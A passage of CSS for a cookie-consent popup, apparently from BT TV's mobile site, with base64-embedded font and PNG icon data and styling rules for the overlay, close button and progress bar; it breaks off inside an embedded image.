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) format("woff"), url(/mobile/assets/45a/5a8cbbe4770ff624ec9f449c5b234a6e.ttf) format("truetype");
  font-weight: 400;
  font-style: normal; }

. {
  display: block;
  /* Hidden by default */
  position: fixed;
  /* Stay in place */
  z-index: 2147483647;
  /* Sit on top */
  left: 0;
  top: 0;
  width: 100%;
  /* Full width */
  height: 100%;
  /* Full height */
  overflow: auto;
  /* Enable scroll if needed */
  background-color: #333;
  /* Fallback color */
  background-color: rgba(0, 0, 0, 0.7);
  /* Black w/ opacity */
  font-family: 'bt_tvregular';
  font-size: 16px; }
  . hr {
    color: #dcddde;
    border-color: #dcddde;
    border: 0;
    border-top: 1px solid; }
  .cookie-ui__cookieUI__popup___3yqQI {
    background-color: #fefefe;
    margin: 15% auto;
    /* 15% from the top and centered */
    border: 1px solid #888;
    border-radius: 10px;
    width: 400px;
    font-family: 'bt_tvlight';
    font-weight: 100; }
    .cookie-ui__cookieUI__popup___3yqQI .cookie-ui__btLogo___3vIiJ {
      margin: 20px;
      width: auto; }
    .cookie-ui__cookieUI__popup___3yqQI .cookie-ui__closeButton___y0w_j {
      width: 15px;
      height: 15px;
      position: absolute;
      top: 10px;
      right: 10px;
      background: url("data:image/png;base64,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UmVhZHlxyWU8AAADfWlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMxNDAgNzkuMTYwNDUxLCAyMDE3LzA1LzA2LTAxOjA4OjIxICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtbG5zOnhtcD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLyIgeG1wTU06T3JpZ2luYWxEb2N1bWVudElEPSJ4bXAuZGlkOjhBQjE4MTdFQUQ5NTExRTY4MEIxOEJEOURBNDM0MjA5IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjU4QUMwNkIxRkQwQjExRTc4QUZBQTE2RUI2QTQ3RUIyIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjU4QUMwNkIwRkQwQjExRTc4QUZBQTE2RUI2QTQ3RUIyIiB4bXA6Q3JlYXRvclRvb2w9IkFkb2JlIFBob3Rvc2hvcCBDQyAoTWFjaW50b3NoKSI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOmY4ZDZkYTJmLWZmYWEtNDU1ZS05ZWVjLTFiNzAwZmUxMmUzMiIgc3RSZWY6ZG9jdW1lbnRJRD0iYWRvYmU6ZG9jaWQ6cGhvdG9zaG9wOmY2M2FhMDQ2LWY1N2QtY2E0OC1iMTA0LTJiMDgwOGJkMDIzYiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PiZX4rsAAADkSURBVHjahJBLCsJADIZHW7yAWz1KoZ7CJ+iiHsCdeAZXegDxUayPO7jzGtaNHqKI/oFUQojjwNcyk3yZSSqJOz6cc3UwBJnzrwCsQR+sQhZrYMcJmUeknA7vG1V8RuBlBH1iDsZ08x68ORgYL7DEGNxDlagLnMDWEmlTFU+jAgPVwgV0OX6TIq1Q9ZZxCykXiITYkqK+uVxncFVnCy1acvncSJ3PQdsnW1OdiBmkukAoRBnMuUf6P8UMUo4fStknfhOtAiRvlBgbw7EKFCT3/oi/CkxJXoEmSDyiLFCAGVh+BBgAZXpFsSEVBNUAAAAASUVORK5CYII=");
      cursor: pointer;
      border: none; }
    .cookie-ui__cookieUI__popup___3yqQI h1, .cookie-ui__cookieUI__popup___3yqQI h2, .cookie-ui__cookieUI__popup___3yqQI h3, .cookie-ui__cookieUI__popup___3yqQI p {
      color: #333; }
    .cookie-ui__cookieUI__popup___3yqQI h1, .cookie-ui__cookieUI__popup___3yqQI h2, .cookie-ui__cookieUI__popup___3yqQI h3 {
      margin: 0;
      font-family: 'bt_tvlight';
      font-weight: normal; }
    .cookie-ui__cookieUI__popup___3yqQI a {
      text-decoration: none; }
      .cookie-ui__cookieUI__popup___3yqQI a:hover {
        text-decoration: underline; }
    .cookie-ui__cookieUI__popup___3yqQI h1 {
      margin-top: 20px; }
    .cookie-ui__cookieUI__popup___3yqQI h2 {
      font-size: 36px;
      line-height: 36px; }
    .cookie-ui__cookieUI__popup___3yqQI h3 {
      margin: 4px 0px;
      font-weight: 100;
      font-size: 28px; }
    .cookie-ui__cookieUI__popup___3yqQI p {
      margin: 20px 0px; }
    .cookie-ui__cookieUI__popup___3yqQI b {
      font-family: 'bt_tvregular'; }
    .cookie-ui__cookieUI__popup___3yqQI .cookie-ui__thanks-all-set___j6zTI {
      position: relative;
      top: -20px; }
    @media (max-width: 420px) {
      .cookie-ui__cookieUI__popup___3yqQI {
        width: 80% !important; } }
    .cookie-ui__cookieUI__popup___3yqQI .cookie-ui__progressBarContainer___1ot8E {
      width: calc(100% - 40px);
      height: 0px;
      margin-left: 20px; }
      .cookie-ui__cookieUI__popup___3yqQI .cookie-ui__progressBarContainer___1ot8E .cookie-ui__progressBarProgress___2zXF_ {
        background: green;
        height: 4px;
        position: relative;
        top: 23px; }
      .cookie-ui__cookieUI__popup___3yqQI .cookie-ui__progressBarContainer___1ot8E .cookie-ui__progressBar___3-xny {
        counter-reset: step;
        height: 4px;
        background: #eee;
        padding: 0;
        margin-top: 20px; }
        .cookie-ui__cookieUI__popup___3yqQI .cookie-ui__progressBarContainer___1ot8E .cookie-ui__progressBar___3-xny .cookie-ui__progressBarActive___1yk7c:last-child:before {
          top: -5px;
          width: 20px;
          height: 20px;
          background: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAKQ2lDQ1BJQ0MgcHJvZmlsZQAAeNqdU3dYk/cWPt/3ZQ9WQtjwsZdsgQAiI6wIyBBZohCSAGGEEBJAxYWIClYUFRGcSFXEgtUKSJ2I4qAouGdBiohai1VcOO4f3Ke1fXrv7e371/u855zn/M55zw+AERImkeaiagA5UoU8Otgfj09IxMm9gAIVSOAEIBDmy8JnBcUAAPADeXh+dLA//AGvbwACAHDVLiQSx+H/g7pQJlcAIJEA4CIS5wsBkFIAyC5UyBQAyBgAsFOzZAoAlAAAbHl8QiIAqg0A7PRJPgUA2KmT3BcA2KIcqQgAjQEAmShHJAJAuwBgVYFSLALAwgCgrEAiLgTArgGAWbYyRwKAvQUAdo5YkA9AYACAmUIszAAgOAIAQx4TzQMgTAOgMNK/4KlfcIW4SAEAwMuVzZdL0jMUuJXQGnfy8ODiIeLCbLFCYRcpEGYJ5CKcl5sjE0jnA0zODAAAGvnRwf44P5Dn5uTh5mbnbO/0xaL+a/BvIj4h8d/+vIwCBAAQTs/v2l/l5dYDcMcBsHW/a6lbANpWAGjf+V0z2wmgWgrQevmLeTj8QB6eoVDIPB0cCgsL7SViob0w44s+/zPhb+CLfvb8QB7+23rwAHGaQJmtwKOD/XFhbnauUo7nywRCMW735yP+x4V//Y4p0eI0sVwsFYrxWIm4UCJNx3m5UpFEIcmV4hLpfzLxH5b9CZN3DQCshk/ATrYHtctswH7uAQKLDljSdgBAfvMtjBoLkQAQZzQyefcAAJO/+Y9AKwEAzZek4wAAvOgYXKiUF0zGCAAARKCBKrBBBwzBFKzADpzBHbzAFwJhBkRADCTAPBBCBuSAHAqhGJZBGVTAOtgEtbADGqARmuEQtMExOA3n4BJcgetwFwZgGJ7CGLyGCQRByAgTYSE6iBFijtgizggXmY4EImFINJKApCDpiBRRIsXIcqQCqUJqkV1II/ItchQ5jVxA+pDbyCAyivyKvEcxlIGyUQPUAnVAuagfGorGoHPRdDQPXYCWomvRGrQePYC2oqfRS+h1dAB9io5jgNExDmaM2WFcjIdFYIlYGibHFmPlWDVWjzVjHVg3dhUbwJ5h7wgkAouAE+wIXoQQwmyCkJBHWExYQ6gl7CO0EroIVwmDhDHCJyKTqE+0JXoS+cR4YjqxkFhGrCbuIR4hniVeJw4TX5NIJA7JkuROCiElkDJJC0lrSNtILaRTpD7SEGmcTCbrkG3J3uQIsoCsIJeRt5APkE+S+8nD5LcUOsWI4kwJoiRSpJQSSjVlP+UEpZ8yQpmgqlHNqZ7UCKqIOp9aSW2gdlAvU4epEzR1miXNmxZDy6Qto9XQmmlnafdoL+l0ugndgx5Fl9CX0mvoB+nn6YP0dwwNhg2Dx0hiKBlrGXsZpxi3GS+ZTKYF05eZyFQw1zIbmWeYD5hvVVgq9ip8FZHKEpU6lVaVfpXnqlRVc1U/1XmqC1SrVQ+rXlZ9pkZVs1DjqQnUFqvVqR1Vu6k2rs5Sd1KPUM9RX6O+X/2C+mMNsoaFRqCGSKNUY7fGGY0hFsYyZfFYQtZyVgPrLGuYTWJbsvnsTHYF+xt2L3tMU0NzqmasZpFmneZxzQEOxrHg8DnZnErOIc4NznstAy0/LbHWaq1mrX6tN9p62r7aYu1y7Rbt69rvdXCdQJ0snfU6bTr3dQm6NrpRuoW623XP6j7TY+t56Qn1yvUO6d3RR/Vt9KP1F+rv1u/RHzcwNAg2kBlsMThj8MyQY+hrmGm40fCE4agRy2i6kcRoo9FJoye4Ju6HZ+M1eBc+ZqxvHGKsNN5l3Gs8YWJpMtukxKTF5L4pzZRrmma60bTTdMzMyCzcrNisyeyOOdWca55hvtm82/yNhaVFnMVKizaLx5balnzLBZZNlvesmFY+VnlW9VbXrEnWXOss623WV2xQG1ebDJs6m8u2qK2brcR2m23fFOIUjynSKfVTbtox7PzsCuya7AbtOfZh9iX2bfbPHcwcEh3WO3Q7fHJ0dcx2bHC866ThNMOpxKnD6VdnG2ehc53zNRemS5DLEpd2lxdTbaeKp26fesuV5RruutK10/Wjm7ub3K3ZbdTdzD3Ffav7TS6bG8ldwz3vQfTw91jicczjnaebp8LzkOcvXnZeWV77vR5Ps5wmntYwbcjbxFvgvct7YDo+PWX6zukDPsY+Ap96n4e+pr4i3z2+I37Wfpl+B/ye+zv6y/2P+L/hefIW8U4FYAHBAeUBvYEagbMDawMfBJkEpQc1BY0FuwYvDD4VQgwJDVkfcpNvwBfyG/ljM9xnLJrRFcoInRVaG/owzCZMHtYRjobPCN8Qfm+m+UzpzLYIiOBHbIi4H2kZmRf5fRQpKjKqLupRtFN0cXT3LNas5Fn7Z72O8Y+pjLk722q2cnZnrGpsUmxj7Ju4gLiquIF4h/hF8ZcSdBMkCe2J5MTYxD2J43MC52yaM5zkmlSWdGOu5dyiuRfm6c7Lnnc8WTVZkHw4hZgSl7I/5YMgQlAvGE/lp25NHRPyhJuFT0W+oo2iUbG3uEo8kuadVpX2ON07fUP6aIZPRnXGMwlPUit5kRmSuSPzTVZE1t6sz9lx2S05lJyUnKNSDWmWtCvXMLcot09mKyuTDeR55m3KG5OHyvfkI/lz89sVbIVM0aO0Uq5QDhZML6greFsYW3i4SL1IWtQz32b+6vkjC4IWfL2QsFC4sLPYuHhZ8eAiv0W7FiOLUxd3LjFdUrpkeGnw0n3LaMuylv1Q4lhSVfJqedzyjlKD0qWlQyuCVzSVqZTJy26u9Fq5YxVhlWRV72qX1VtWfyoXlV+scKyorviwRrjm4ldOX9V89Xlt2treSrfK7etI66Trbqz3Wb+vSr1qQdXQhvANrRvxjeUbX21K3nShemr1js20zcrNAzVhNe1bzLas2/KhNqP2ep1/XctW/a2rt77ZJtrWv913e/MOgx0VO97vlOy8tSt4V2u9RX31btLugt2PGmIbur/mft24R3dPxZ6Pe6V7B/ZF7+tqdG9s3K+/v7IJbVI2jR5IOnDlm4Bv2pvtmne1cFoqDsJB5cEn36Z8e+NQ6KHOw9zDzd+Zf7f1COtIeSvSOr91rC2jbaA9ob3v6IyjnR1eHUe+t/9+7zHjY3XHNY9XnqCdKD3x+eSCk+OnZKeenU4/PdSZ3Hn3TPyZa11RXb1nQ8+ePxd07ky3X/fJ897nj13wvHD0Ivdi2yW3S609rj1HfnD94UivW2/rZffL7Vc8rnT0Tes70e/Tf/pqwNVz1/jXLl2feb3vxuwbt24m3Ry4Jbr1+Hb27Rd3Cu5M3F16j3iv/L7a/eoH+g/qf7T+sWXAbeD4YMBgz8NZD+8OCYee/pT/04fh0kfMR9UjRiONj50fHxsNGr3yZM6T4aeypxPPyn5W/3nrc6vn3/3i+0vPWPzY8Av5i8+/rnmp83Lvq6mvOscjxx+8znk98ab8rc7bfe+477rfx70fmSj8QP5Q89H6Y8en0E/3Pud8/vwv94Tz+4A5JREAAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAADI2lUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMxNDAgNzkuMTYwNDUxLCAyMDE3LzA1LzA2LTAxOjA4OjIxICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ0MgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6QzhBODQ4RkQzOTdDMTFFOEIyQ0ZBREJCRTdGRjg0NjYiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6QzhBODQ4RkUzOTdDMTFFOEIyQ0ZBREJCRTdGRjg0NjYiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpDOEE4NDhGQjM5N0MxMUU4QjJDRkFEQkJFN0ZGODQ2NiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpDOEE4NDhGQzM5N0M